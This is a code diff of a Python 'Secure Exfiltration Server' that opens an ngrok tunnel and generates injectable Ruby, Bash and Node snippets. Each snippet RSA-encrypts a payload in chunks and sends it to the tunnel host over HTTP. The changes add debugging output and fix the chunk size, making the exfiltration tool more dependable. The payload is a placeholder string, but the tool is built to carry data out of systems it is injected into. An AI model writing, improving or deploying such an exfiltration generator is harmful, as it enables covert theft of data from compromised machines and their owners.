@@ -12,26 +12,48 @@ import requests
 import json
 import argparse
 
-def get_ngrok_url():
+def get_ngrok_url(verbose=False):
     ngrok_api = 'http://127.0.0.1:4040/api/tunnels'
     retries = 10
     wait_seconds = 2
 
-    for _ in range(retries):
+    for attempt in range(retries):
         try:
-            response = requests.get(ngrok_api)
-            tunnels = json.loads(response.text).get('tunnels', [])
+            if verbose:
+                print(f"[verbose] Attempt {attempt + 1}/{retries}: GET {ngrok_api}", file=sys.stderr)
+            response = requests.get(ngrok_api, timeout=5)
+            if verbose:
+                print(f"[verbose] Response status: {response.status_code}", file=sys.stderr)
+            data = json.loads(response.text)
+            tunnels = data.get('tunnels', [])
+            if verbose:
+                print(f"[verbose] Found {len(tunnels)} tunnel(s): {[t.get('proto') for t in tunnels]}", file=sys.stderr)
             for tunnel in tunnels:
-                if tunnel['proto'] == 'https':
-                    return tunnel['public_url']
-        except requests.ConnectionError:
-            pass
-        time.sleep(wait_seconds)
+                if tunnel.get('proto') == 'https':
+                    url = tunnel.get('public_url')
+                    if verbose:
+                        print(f"[verbose] Using HTTPS tunnel: {url}", file=sys.stderr)
+                    return url
+            if verbose and tunnels:
+                print(f"[verbose] No HTTPS tunnel in list", file=sys.stderr)
+        except requests.ConnectionError as e:
+            if verbose:
+                print(f"[verbose] ConnectionError: {e}", file=sys.stderr)
+        except requests.Timeout:
+            if verbose:
+                print(f"[verbose] Request timed out", file=sys.stderr)
+        except Exception as e:
+            if verbose:
+                print(f"[verbose] Error: {type(e).__name__}: {e}", file=sys.stderr)
+        if attempt < retries - 1:
+            time.sleep(wait_seconds)
 
-    print("Failed to retrieve ngrok URL.")
+    print("Failed to retrieve ngrok URL.", file=sys.stderr)
+    if not verbose:
+        print("Run with --verbose for details.", file=sys.stderr)
     sys.exit(1)
 
-def generate_ruby_code(pub, hostname):
+def generate_ruby_code(pub, hostname, chunk_size):
     return f'''
 require 'openssl'
 require 'base64'
@@ -41,47 +63,49 @@ require 'uri'
 debug = false
 payload = "hello world " * 1000
 public_key = OpenSSL::PKey::RSA.new("{pub}")
-chunks = payload.scan(/.{{1,#{public_key.n.num_bytes - 42}}}/m)
+chunks = payload.scan(/.{{1,{chunk_size}}}/m)
 midx = (0...10).map {{ ('a'..'z').to_a[rand(26)] }}.join
 chunks.each_with_index {{ |chunk, index| encrypted_chunk = public_key.public_encrypt(chunk); encrypted_base64_chunk = Base64.strict_encode64(encrypted_chunk).strip; encoded_chunk = URI.encode_www_form_component(encrypted_base64_chunk); uri = URI.parse("{hostname}/"); uri.query = "n=" + encoded_chunk + "&m=" + midx + "&x=" + index.to_s + "&z=" + chunks.length.to_s; response = Net::HTTP.get_response(uri); puts "==> " + response.code + ": [" + response.body + "]" if debug }}
 '''
 
-def generate_shell_code(pub, hostname):
+def generate_shell_code(pub, hostname, chunk_size):
+    # PEM with $'...' so bash interprets \n as newlines
     return f'''
 #!/bin/bash
 
 export LC_ALL=C
 
 payload=$(printf 'hello world %.0s' {{1..1000}})
-public_key=$(echo "{pub}" | base64 -d)
-chunks=$(echo -n "$payload" | fold -w $(( $(echo -n "$public_key" | wc -c) - 42 )))
+chunk_size={chunk_size}
+public_key_pem=$'{pub}'
 midx=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 10 | head -n 1)
 index=0
-for chunk in $chunks; do
-    encrypted_chunk=$(echo -n "$chunk" | openssl pkeyutl -encrypt -pubin -inkey <(echo "$public_key" | openssl pkey -pubin -outform PEM) | base64 -w 0)
+total=$(echo -n "$payload" | fold -w $chunk_size | wc -l)
+echo -n "$payload" | fold -w $chunk_size | while IFS= read -r chunk; do
+    encrypted_chunk=$(echo -n "$chunk" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$public_key_pem") | base64 -w 0)
     encoded_chunk=$(echo -n "$encrypted_chunk" | jq -sRr @uri)
-    curl -G "{hostname}/" --data-urlencode "n=$encoded_chunk" --data-urlencode "m=$midx" --data-urlencode "x=$index" --data-urlencode "z=$(echo $chunks | wc -w)"
+    curl -sG "{hostname}/" --data-urlencode "n=$encoded_chunk" --data-urlencode "m=$midx" --data-urlencode "x=$index" --data-urlencode "z=$total"
     index=$((index + 1))
 done
 '''
 
-def generate_node_code(pub, hostname):
+def generate_node_code(pub, hostname, chunk_size):
     return f'''
 const crypto = require('crypto');
 const https = require('https');
 const querystring = require('querystring');
 
 const payload = 'hello world '.repeat(1000);
-const publicKey = `{pub.replace("\\n", "\\n")}`;
-const chunks = payload.match(new RegExp('.{1,' + (crypto.publicEncrypt(publicKey, Buffer.alloc(0)).length - 42) + '}', 'g'));
-const midx = Array.from({length: 10}, () => String.fromCharCode(97 + Math.floor(Math.random() * 26))).join('');
+const publicKey = `{pub}`;
+const chunkSize = {chunk_size};
+const chunks = payload.match(new RegExp('.{{1,' + chunkSize + '}}', 'g')) || [payload];
+const midx = Array.from({{length: 10}}, () => String.fromCharCode(97 + Math.floor(Math.random() * 26))).join('');
 
 chunks.forEach((chunk, index) => {{
-    const encryptedChunk = crypto.publicEncrypt(publicKey, Buffer.from(chunk));
-    const encodedChunk = querystring.escape(encryptedChunk.toString('base64'));
-    const query = querystring.stringify({n: encodedChunk, m: midx, x: index, z: chunks.length});
-    https.get(`{hostname}/?${query}`, (res) => {{
-        res.on('data', (d) => process.stdout.write(d));
+    const encryptedChunk = crypto.publicEncrypt({{key: publicKey, padding: crypto.constants.RSA_PKCS1_PADDING}}, Buffer.from(chunk, 'utf8'));
+    const query = querystring.stringify({{n: encryptedChunk.toString('base64'), m: midx, x: String(index), z: String(chunks.length)}});
+    https.get(`{hostname}/?${{query}}`, (res) => {{
+        res.on('data', () => {{}});
     }});
 }});
 '''
@@ -89,9 +113,10 @@ chunks.forEach((chunk, index) => {{
 def main():
     parser = argparse.ArgumentParser(description='Secure Exfiltration Server')
     parser.add_argument('--lang', choices=['ruby', 'shell', 'node'], default='ruby', help='Language for payload generation')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output for debugging ngrok connection')
     args = parser.parse_args()
 
-    hostname = get_ngrok_url()
+    hostname = get_ngrok_url(verbose=args.verbose)
     print(f"Ngrok URL: {hostname}")
 
     app = Flask(__name__)
@@ -108,12 +133,15 @@ def main():
         format=serialization.PublicFormat.SubjectPublicKeyInfo
     ).decode().replace("\n", "\\n")
 
+    # RSA 2048 with PKCS1v15: max plaintext = 256 - 11 = 245 bytes
+    chunk_size = (private_key.key_size // 8) - 11
+
     if args.lang == 'ruby':
-        code = generate_ruby_code(pub, hostname)
+        code = generate_ruby_code(pub, hostname, chunk_size)
     elif args.lang == 'shell':
-        code = generate_shell_code(pub, hostname)
+        code = generate_shell_code(pub, hostname, chunk_size)
     elif args.lang == 'node':
-        code = generate_node_code(pub, hostname)
+        code = generate_node_code(pub, hostname, chunk_size)
 
     print(f"Code to inject, for safe transmission:\n=================================\n{code}\n=================================\n")
 
